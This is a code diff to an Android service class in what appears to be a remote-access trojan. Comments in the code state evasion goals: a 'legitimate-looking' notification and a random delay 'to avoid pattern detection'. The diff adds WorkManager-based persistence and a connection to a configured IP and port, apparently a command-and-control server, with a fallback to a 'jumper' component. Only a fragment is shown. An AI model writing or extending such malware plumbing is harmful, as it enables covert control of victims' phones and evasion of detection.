@@ -37,10 +37,31 @@ public class mainService extends Service {
         // Create legitimate-looking foreground notification for Android 8+
         startForeground(NOTIFICATION_ID, createNotification());
         
+        // Initialize WorkManager for background tasks
+        try {
+            WorkScheduler.initializeAllWork(this);
+            Log.d(TAG, "WorkManager tasks initialized");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to initialize WorkManager", e);
+        }
+        
         // Add random delay to avoid pattern detection
         int delay = 3000 + random.nextInt(7000); // 3-10 seconds
         new android.os.Handler().postDelayed(() -> {
-            new jumper(getApplicationContext()).init();
+            try {
+                // Try secure connection first, fallback to regular
+                SecureTcpConnection secureConn = new SecureTcpConnection();
+                if (secureConn.connect(config.IP, Integer.parseInt(config.port))) {
+                    Log.d(TAG, "Secure connection established from service");
+                    secureConn.disconnect(); // Just test connection
+                } else {
+                    // Fallback to regular connection
+                    new jumper(getApplicationContext()).init();
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Connection failed, will retry via WorkManager", e);
+                // WorkManager will handle retries
+            }
         }, delay);
         
         return START_STICKY;
